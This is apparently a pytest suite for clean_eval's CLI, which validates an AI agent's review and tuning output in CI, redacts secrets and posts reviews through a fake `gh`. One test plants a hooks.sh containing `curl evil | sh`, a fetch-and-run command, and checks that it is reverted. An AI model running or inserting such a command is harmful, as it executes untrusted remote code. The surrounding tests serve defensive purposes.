"""The command line (external/cli.py): its composition root, the CI commands over real files and a fake `gh`, and
`python -I clean_eval <command>` end to end on throwaway repositories."""

import argparse
import contextlib
import copy
import datetime as dt
import io
import json
import os
import shutil
import subprocess
import sys

import pytest

from clean_eval.domain.errors import InvalidRequest
from clean_eval.domain.review import AgentReview, RiskReport
from clean_eval.external import cli
from clean_eval.external.filesystem import FileSystemGateway
from clean_eval.use_cases.evaluation import SNAPSHOT, snapshot_tuning
from clean_eval.use_cases.review import lines_on_diff
from clean_eval.use_cases.rules.review import finalize_review, parse_rules, redact
from tests.domain.builders import facts
from tests.helpers import ROOT, Repo, days_ago, read, read_json, write, write_json

# The composition root (external/cli.py): what it builds from the request and this process's environment.


def test_period_bounds():
    p = cli.period("2026-01-01", "2026-01-31", 10)
    assert (p.lookahead_until, p.window_days) == (dt.date(2026, 2, 10), 10)
    assert p.until_ts == dt.datetime(2026, 1, 31, 23, 59, 59, tzinfo=dt.timezone.utc).timestamp()
    with pytest.raises(InvalidRequest):
        cli.period("2026-01-01", "soon")


def test_the_secrets_come_from_this_process_environment(monkeypatch):
    monkeypatch.setenv("SOME_SECRET", "hunter2-hunter2")
    assert redact("pw hunter2-hunter2", cli.secrets())[0] == "pw [REDACTED]"


# The CI commands (external/cli.py) end to end over real files and a fake `gh`: finalizing the agent's review or eval
# (tuning edits kept only when they validate), and posting the review.

RULES = """
| ID | Severity | Min tier | Rule |
|---|---|---|---|
| CA-01 | blocker | Low | dependency rule |
| Q-02 | major | Moderate | failure paths |
| Q-04 | minor | Moderate | clarity |
"""


def quietly(fn, *args):
    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
        return fn(*args)


def hist_fixture(hot=6, cold=16):
    """An eval-history.json with `hot` defective PRs on widely-depended-on modules hot0.. and `cold` clean PRs on leaf
    modules cold0..: under the default policy every hot PR outscores every cold one (AUC 1.0)."""

    def pr(n, name, fan_in, defective):
        f = facts(name=name, fan_in=fan_in).model_dump(mode="json")
        defect = {
            "fix_sha": "%040x" % (1000 + n),
            "subject": "fix",
            "kind": "fix",
            "confidence": "heuristic",
            "days_after": 1.0,
            "overlap_files": [name + ".py"],
        }
        return {
            "sha": "%040x" % n,
            "base": "%040x" % (500 + n),
            "author": "dev",
            "ts": n,
            "subject": "pr",
            "pr": n,
            "max_tier": "Moderate",
            "max_score": 0,
            "defects": [defect] if defective else [],
            "modules": [{"module": name, "band": "Moderate", "score": 0, "rated": True, "facts": f}],
        }

    prs = [pr(i, "hot%d" % i, 6, True) for i in range(hot)] + [pr(hot + i, "cold%d" % i, 0, False) for i in range(cold)]
    return {
        "period": {
            "since": "2026-01-01",
            "until": "2026-02-01",
            "branch": "main",
            "defect_window_days": 30,
            "policy_version": 2,
        },
        "totals": {"prs": len(prs), "defective_prs": hot},
        "calibration": {"auc_max_score": 1.0 if hot and cold else None},
        "prs": prs,
    }


HEAD = "c" * 40
RISK = {
    "pr": 1,
    "base": "b" * 40,
    "head": HEAD,
    "max_tier": "High",
    "max_score": 52,
    "model_source": "clean-eval default",
    "model_version": 2,
    "rules_source": "clean-eval default",
    "rules_version": "abcd1234",
    "files_changed": 1,
    "modules": [],
    "files": {"a.py": None},
    "ignored": [],
    "notes": [],
}


def finding(**kw):
    return {"rule": "Q-02", "severity": "major", "file": "a.py", "line": 3, "summary": "s", **kw}


def review(*findings, raw=None, risk=None, rules=RULES):
    """The Review CI trusts from what the agent proposed (`findings`, or a whole result.json as `raw`)."""
    return finalize_review(
        AgentReview.model_validate({"findings": list(findings)} if raw is None else raw),
        RiskReport.model_validate(risk or RISK),
        parse_rules(rules),
    )


class TestFinalizeEval:
    """The tuning files are snapshotted before the agent runs (as `prepare eval` does); finalize keeps an edit only when
    it passes validation and restores everything else."""

    @pytest.fixture(autouse=True)
    def workspace(self, tmp_path):
        """A workspace with .clean-eval/, a context folder with the history, and the snapshot `prepare eval` takes."""
        self.dir = str(tmp_path)
        self.ctx, self.agent, self.out, self.ws = (os.path.join(self.dir, d) for d in ("ctx", "agent", "out", "ws"))
        self.live = os.path.join(self.ws, ".clean-eval")
        for d in (self.ctx, self.agent, self.out, self.live):
            os.makedirs(d)
        self.orig = {}  # no overrides yet
        self.use_history(hist_fixture())
        self.model_path = os.path.join(self.live, "risk-model.json")
        self.rules_path = os.path.join(self.live, "review-rules.md")
        self.gh_out = os.path.join(self.dir, "gh_out")
        self.snapshot()

    def snapshot(self):
        snap = os.path.join(self.ctx, SNAPSHOT)
        shutil.rmtree(snap, ignore_errors=True)
        snapshot_tuning(FileSystemGateway(), self.ws, snap)

    def use_history(self, hist):
        write_json(os.path.join(self.ctx, "eval-history.json"), hist)

    def run_finalize(self, agent_result, apply=True):
        if agent_result is not None:
            write_json(os.path.join(self.agent, "result.json"), agent_result)
        a = argparse.Namespace(
            skill="eval",
            ctx=self.ctx,
            agent=self.agent,
            out=self.out,
            workspace=self.ws,
            apply=apply,
            gh_output=self.gh_out,
        )
        return quietly(cli.finalize, a) or 0

    def write_model(self, mutate):
        m = copy.deepcopy(self.orig)
        mutate(m)
        write_json(self.model_path, m, indent=2)

    def result(self):
        return read_json(os.path.join(self.out, "result.json"))

    def test_valid_tuning_accepted(self):
        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
        assert (
            self.run_finalize({"recommendations": [{"target": "risk-model.json", "change": "c", "evidence": "e"}]}) == 0
        )
        res = self.result()
        assert res["model_change"]["accepted"]
        assert res["applied"]
        assert os.path.exists(self.model_path)
        assert "applied=true" in read(self.gh_out)
        assert res["recommendations"] == [{"target": "risk-model.json", "change": "c", "evidence": "e"}]

    def test_structural_edit_reverted(self):
        self.write_model(lambda m: m.update(depth=1))
        assert self.run_finalize({"recommendations": []}) == 0
        assert not self.result()["model_change"]["accepted"]
        assert not os.path.exists(self.model_path)  # didn't exist before → removed

    def test_edit_that_lowers_auc_reverted(self):
        # drop the only term that tells hot from cold modules: every PR scores the same → AUC 0.5 < 1.0
        self.write_model(lambda m: m.update(business_weights={"dependents": 0}, effects_mix={"dependents": 0}))
        self.run_finalize({"recommendations": []})
        res = self.result()
        assert not res["model_change"]["accepted"]
        assert "below" in res["model_change"]["reason"]

    def test_small_sample_rejected(self):
        self.use_history(hist_fixture(hot=3, cold=10))
        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
        self.run_finalize({"recommendations": []})
        assert "sample too small" in self.result()["model_change"]["reason"]
        assert not os.path.exists(self.model_path)

    def test_undefined_auc_rejected(self):
        self.use_history(hist_fixture(hot=0, cold=30))
        self.write_model(lambda m: m.update(unrated_band="Low"))
        self.run_finalize({"recommendations": []})
        assert not self.result()["model_change"]["accepted"]
        assert not os.path.exists(self.model_path)

    def test_edits_rejected_when_apply_false(self):
        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
        self.run_finalize({"recommendations": []}, apply=False)
        assert not os.path.exists(self.model_path)
        assert self.result()["model_change"] == {"accepted": False, "reason": "apply=false"}

    def test_invalid_agent_output_reverts_accepted_edits(self):
        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
        write(os.path.join(self.agent, "result.json"), "not json")
        assert self.run_finalize(None) == 2
        assert not os.path.exists(self.model_path)
        assert not os.path.exists(os.path.join(self.out, "result.json"))

    def test_unreadable_history_reverts_edits(self):
        write(os.path.join(self.ctx, "eval-history.json"), "{broken")
        self.write_model(lambda m: m.update(business_weights={"dependents": 0.4}))
        assert self.run_finalize({"recommendations": []}) == 2
        assert not os.path.exists(self.model_path)

    def test_removing_the_model_is_judged_like_an_edit(self):
        write_json(self.model_path, {"depth": 2, "business_weights": {"dependents": 0.35}})
        self.snapshot()
        os.remove(self.model_path)  # back to the defaults would also change `depth`, which CI may not
        self.run_finalize({"recommendations": []})
        assert not self.result()["model_change"]["accepted"]
        assert read_json(self.model_path) == {"depth": 2, "business_weights": {"dependents": 0.35}}

    def test_removing_the_rules_is_reverted(self):
        write(self.rules_path, RULES)
        self.snapshot()
        os.remove(self.rules_path)
        self.run_finalize({"recommendations": []})
        assert self.result()["rules_change"] == {"accepted": False, "reason": "review-rules.md may not be removed"}
        assert read(self.rules_path) == RULES

    def test_valid_rules_edit_accepted(self):
        write(self.rules_path, RULES)
        self.snapshot()
        write(self.rules_path, RULES + "| Q-05 | major | High | new rule |\n")
        self.run_finalize({"recommendations": []})
        assert self.result()["rules_change"] == {"accepted": True}
        assert "Q-05" in read(self.rules_path)

    def test_other_clean_eval_files_restored(self):
        write(os.path.join(self.live, "notes.md"), "original")
        write(os.path.join(self.live, "sub", "keep.txt"), "k")
        self.snapshot()
        write(os.path.join(self.live, "notes.md"), "tampered")  # changed
        write(os.path.join(self.live, "hooks.sh"), "curl evil | sh")  # created
        os.remove(os.path.join(self.live, "sub", "keep.txt"))  # deleted
        self.run_finalize({"recommendations": []})
        assert read(os.path.join(self.live, "notes.md")) == "original"
        assert not os.path.exists(os.path.join(self.live, "hooks.sh"))
        assert read(os.path.join(self.live, "sub", "keep.txt")) == "k"
        assert self.result()["other_files_reverted"] == ["hooks.sh", "notes.md", os.path.join("sub", "keep.txt")]

    def test_bad_rules_edit_reverted(self):
        write(self.rules_path, RULES + "| CA-01 | major | Low | duplicate |\n")
        self.run_finalize({"recommendations": []})
        assert not os.path.exists(self.rules_path)


class TestFinalizeReview:
    @pytest.fixture(autouse=True)
    def review_context(self, tmp_path):
        """The context `prepare pr-review` writes: the risk report and the review rules."""
        self.dir = str(tmp_path)
        self.ctx, self.agent, self.out = (os.path.join(self.dir, d) for d in ("ctx", "agent", "out"))
        write_json(os.path.join(self.ctx, "risk.json"), RISK)
        write(os.path.join(self.ctx, "review-rules.md"), RULES)
        os.makedirs(self.agent)
        self.gh_out = os.path.join(self.dir, "gh_out")

    def finalize(self):
        a = argparse.Namespace(
            skill="pr-review",
            ctx=self.ctx,
            agent=self.agent,
            out=self.out,
            workspace=".",
            apply=False,
            gh_output=self.gh_out,
        )
        return quietly(cli.finalize, a) or 0

    def test_outputs_are_derived_and_the_report_sanitized(self):
        write_json(os.path.join(self.agent, "result.json"), {"findings": [finding(rule="CA-01", severity="minor")]})
        write(
            os.path.join(self.agent, "report.md"), "## Review\n<!-- clean-eval:pr-review tier=Low -->\nghp_" + "x" * 36
        )
        assert self.finalize() == 0
        assert read(self.gh_out).splitlines() == [
            "verdict=request_changes",
            "max-tier=High",
            "max-score=52",
            "blockers=1",
        ]
        report = read(os.path.join(self.out, "report.md"))
        assert "clean-eval:" not in report
        assert "ghp_" not in report
        assert read_json(os.path.join(self.out, "result.json"))["redactions"] == 1

    def test_invalid_output_writes_nothing(self):
        write(os.path.join(self.agent, "result.json"), "[]")
        assert self.finalize() == 2
        assert not os.path.exists(os.path.join(self.out, "result.json"))
        assert not os.path.exists(self.gh_out)


class TestPost:
    @pytest.fixture(autouse=True)
    def validated_review(self, tmp_path, fake_bin):
        """The validated result and report `finalize` wrote, and a fake `gh` to post them with."""
        self.bin = fake_bin
        self.out = str(tmp_path / "out")
        os.makedirs(self.out)
        res = review(finding(rule="CA-01", severity="blocker"), finding(file=None, line=None))
        write_json(os.path.join(self.out, "result.json"), res.model_dump(mode="json"))
        write(os.path.join(self.out, "report.md"), "## Review\n")

    def post(self, ctx=None):
        return quietly(cli.post, argparse.Namespace(pr="1", out=self.out, head=HEAD, ctx=ctx))

    def test_fallbacks_and_dismissal(self):
        marker = "<!-- clean-eval:pr-review tier=High -->"
        self.bin.gh(
            {
                "post_review": [
                    {"exit": 1, "err": "HTTP 422: line must be part of the diff"},
                    {"exit": 0, "out": {"id": 50, "user": {"login": "github-actions[bot]"}}},
                ],
                "list_reviews": {
                    "out": [
                        {
                            "id": 10,
                            "state": "CHANGES_REQUESTED",
                            "user": {"login": "github-actions[bot]"},
                            "body": marker,
                        },
                        {"id": 11, "state": "CHANGES_REQUESTED", "user": {"login": "human"}, "body": marker},
                        {"id": 12, "state": "COMMENTED", "user": {"login": "github-actions[bot]"}, "body": marker},
                        {
                            "id": 50,
                            "state": "CHANGES_REQUESTED",
                            "user": {"login": "github-actions[bot]"},
                            "body": marker,
                        },
                    ]
                },
                "dismiss": {"exit": 0, "out": "{}"},
            }
        )
        assert self.post() == 0
        calls = self.bin.gh_calls()
        posts = [json.loads(c["stdin"]) for c in calls if "POST" in c["args"]]
        assert [p["event"] for p in posts] == ["REQUEST_CHANGES", "REQUEST_CHANGES"]
        assert "comments" in posts[0]
        assert "comments" not in posts[1]  # retried without inline comments
        assert "clean-eval:pr-review tier=High" in posts[1]["body"]
        assert "rules=CA-01,Q-02" in posts[1]["body"]
        assert "score=52 " in posts[1]["body"]  # scores are integers 0-100
        dismissed = [c["args"] for c in calls if "PUT" in c["args"]]
        assert len(dismissed) == 1
        assert any(a.endswith("/reviews/10/dismissals") for a in dismissed[0])

    def test_only_on_diff_comments_attached(self):
        ctx = os.path.join(self.out, "ctx")
        write_json(
            os.path.join(ctx, "diff", "index.json"),
            [
                {
                    "file": "a.py",
                    "module": None,
                    "patch": "diff/001.patch",
                    "patch_lines": 8,
                    "added": 1,
                    "removed": 1,
                    "truncated": False,
                }
            ],
        )
        write(
            os.path.join(ctx, "diff", "001.patch"),
            "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n",
        )
        assert lines_on_diff(FileSystemGateway(), ctx) == {"a.py": {1, 2, 3}}
        res = read_json(os.path.join(self.out, "result.json"))
        res["findings"][0]["line"] = 40  # outside the diff
        res["findings"].append({**res["findings"][0], "line": 2, "summary": "on diff"})
        write_json(os.path.join(self.out, "result.json"), res)
        self.bin.gh({"post_review": {"out": {"id": 5, "user": {"login": "x[bot]"}}}, "list_reviews": {"out": []}})
        assert self.post(ctx) == 0
        posts = [json.loads(c["stdin"]) for c in self.bin.gh_calls() if "POST" in c["args"]]
        assert len(posts) == 1  # no 422 retry needed
        assert [c["line"] for c in posts[0]["comments"]] == [2]
        assert "`a.py:40`" in posts[0]["body"]

    def test_all_attempts_fail(self):
        self.bin.gh({"post_review": {"exit": 1, "err": "HTTP 403"}})
        assert self.post() == 1
        assert len([c for c in self.bin.gh_calls() if "POST" in c["args"]]) == 4

    def test_an_unreadable_reply_is_not_posted_twice(self):
        self.bin.gh({"post_review": {"exit": 0, "out": "<html>oops</html>"}, "list_reviews": {"out": []}})
        assert self.post() == 0
        assert len([c for c in self.bin.gh_calls() if "POST" in c["args"]]) == 1
        assert not [c for c in self.bin.gh_calls() if "PUT" in c["args"]]


# The command line end to end: `python -I clean_eval <command>` (the environment uv.lock pins) on throwaway repositories.

pytestmark = pytest.mark.e2e  # every test runs `python -I clean_eval ...` in a subprocess

CE = os.path.join(ROOT, "clean_eval")


def run(repo, *args):
    return subprocess.run([sys.executable, "-I", CE, *args], cwd=repo, capture_output=True, text=True)


D = lambda s: dt.datetime.fromisoformat(s + "T12:00:00+00:00")  # noqa: E731


class TestCli:
    @pytest.fixture(autouse=True, scope="class")
    @classmethod
    def repository(cls, tmp_path_factory):
        """A repository with two commits, and a folder for the commands' output (made once for the class)."""
        cls.repo = r = Repo(tmp_path_factory.mktemp("repo"))
        cls.base = r.commit(
            "init",
            {
                "src/billing/core.py": "import requests\n\ndef charge(x):\n    return requests.post('u', json=x)\n"
                + "\n".join("def f%d(a):\n    return a\n" % i for i in range(60)),
                "src/billing/models.py": "class Invoice:\n    pass\n" * 40,
                "src/users/api.py": "from src.billing.core import charge\n\ndef sign_up(u):\n    return charge(u)\n"
                * 30,
                "tests/test_core.py": "from src.billing.core import charge\n\ndef test_charge():\n    assert charge\n",
            },
            when=days_ago(4),
        )
        cls.head = r.commit(
            "feat: users",
            {
                "src/users/api.py": "def sign_up(u):\n    return u\n",
                "docs/x.md": "doc\n",
                "infra/main.tf": "resource {}\n",
            },
            when=days_ago(2),
        )
        cls.out = str(tmp_path_factory.mktemp("out"))

    def test_rate_and_report(self):
        r = run(self.repo.path, "rate", "--depth", "2", "--out", self.out)
        assert r.returncode == 0, r.stderr
        data = json.loads(read(os.path.join(self.out, "data.json")))
        assert sorted(m["name"] for m in data["modules"]) == ["src/billing", "src/users"]
        assert "Policy: clean-eval default" in data["notes"]
        report = run(self.repo.path, "report", os.path.join(self.out, "data.json"))
        assert "| `src/" in report.stdout

    def test_the_readme_section_is_the_only_publishing_output(self):
        usage = run(self.repo.path, "--help").stdout
        assert "{rate,readme,report,assess,history,prepare,finalize,post,redact,guard}" in usage
        for gone in ("render", "diagram"):
            assert run(self.repo.path, gone, "x").returncode != 0, gone

    def test_rate_a_past_revision(self):
        out = os.path.join(self.out, "rev")
        r = run(self.repo.path, "rate", "--rev", self.base, "--out", out)
        assert r.returncode == 0, r.stderr
        assert json.loads(read(os.path.join(out, "data.json")))["ref"] == self.base
        bad = run(self.repo.path, "rate", "--rev", self.base, "--graph", "code-review-graph", "--out", out)
        assert bad.returncode != 0
        assert "only --graph builtin" in bad.stderr

    def test_readme_is_written_once_then_left_alone(self, repo):
        repo.commit("init", {"app/a.py": "def a():\n    return 1\n", "README.md": "# App\n"}, when=days_ago(2))
        out = os.path.join(self.out, "readme")
        assert run(repo.path, "rate", "--out", out).returncode == 0
        status = os.path.join(out, "status.json")
        first = run(repo.path, "readme", os.path.join(out, "data.json"), "--status-json", status)
        assert first.returncode == 0, first.stderr
        assert json.loads(read(status))["readme_changed"]
        text = read(os.path.join(repo.path, "README.md"))
        assert text.startswith("# App\n\n## Risk Heat Map\n\n<!-- risk-heat-map:start -->")
        assert "](docs/risk-heatmap.svg)" in text
        assert os.path.exists(os.path.join(repo.path, "docs", "risk-heatmap.svg"))
        again = run(repo.path, "readme", os.path.join(out, "data.json"), "--status-json", status)
        assert "unchanged" in again.stdout
        assert not json.loads(read(status))["readme_changed"]

    def test_assess_a_change_from_its_base(self):
        r = run(self.repo.path, "assess", "--base", self.base, "--head", self.head)
        assert r.returncode == 0, r.stderr
        risk = json.loads(r.stdout)
        assert risk["files"]["src/users/api.py"] == "src/users"
        assert risk["ignored"] == ["docs/x.md"]
        mods = {m["module"]: m for m in risk["modules"]}
        assert not mods["infra"]["rated"]
        assert mods["infra"]["band"] == "Moderate"
        assert risk["max_band"] in ("Moderate", "High", "Critical")

    def test_invalid_policy_is_reported_not_raised(self, repo):
        repo.commit(
            "init", {"a/b.py": "x = 1\n", ".clean-eval/risk-model.json": '{"window_days": 30}'}, when=days_ago(1)
        )
        r = run(repo.path, "rate", "--out", os.path.join(self.out, "bad"))
        assert r.returncode != 0
        assert "v1 model" in r.stderr
        assert "Traceback" not in r.stderr


class TestHistoryCommand:
    """The eval skill runs `uv run ... python -I <checkout>/clean_eval history ...` from the repository it evaluates."""

    @pytest.fixture(autouse=True)
    def folder(self, tmp_path):
        self.dir = str(tmp_path)

    def run_ce(self, *args):
        return subprocess.run(
            [sys.executable, "-I", CE, "history", *args], cwd=self.dir, capture_output=True, text=True
        )

    def test_replay_and_sensitivity_from_any_folder(self):
        r = Repo(self.dir)
        r.commit("init", {"src/a/x.py": "1\n"}, when=D("2026-01-01"))
        r.commit("feat: a (#1)", {"src/a/x.py": "2\n"}, when=D("2026-02-01"))
        r.commit("fix: a (#2)", {"src/a/x.py": "3\n"}, when=D("2026-02-02"))
        out = os.path.join(self.dir, "h.json")
        res = self.run_ce("--since", "2026-01-15", "--until", "2026-02-28", "--out", out)
        assert res.returncode == 0, res.stderr
        assert "2 PRs, 1 with escaped defects" in res.stderr
        write_json(os.path.join(self.dir, "candidate.json"), {"business_weights": {"dependents": 0.4}})
        replayed = self.run_ce("--from-history", out, "--replay", os.path.join(self.dir, "candidate.json"))
        assert set(json.loads(replayed.stdout)) == {"auc_max_score", "by_band", "band_mix"}
        rows = json.loads(self.run_ce("--from-history", out, "--sensitivity").stdout)
        assert rows[0]["change"] == "baseline"

    @pytest.mark.parametrize(
        ("args", "message"),
        [
            (["--sensitivity"], "need --from-history"),
            ([], "--since is required"),
            (["--since", "last week"], "YYYY-MM-DD"),
        ],
        ids=["sensitivity without a history", "no period", "not a date"],
    )
    def test_usage_errors_are_reported_not_raised(self, args, message):
        Repo(self.dir)
        res = self.run_ce(*args)
        assert res.returncode != 0
        assert message in res.stderr
        assert "Traceback" not in res.stderr
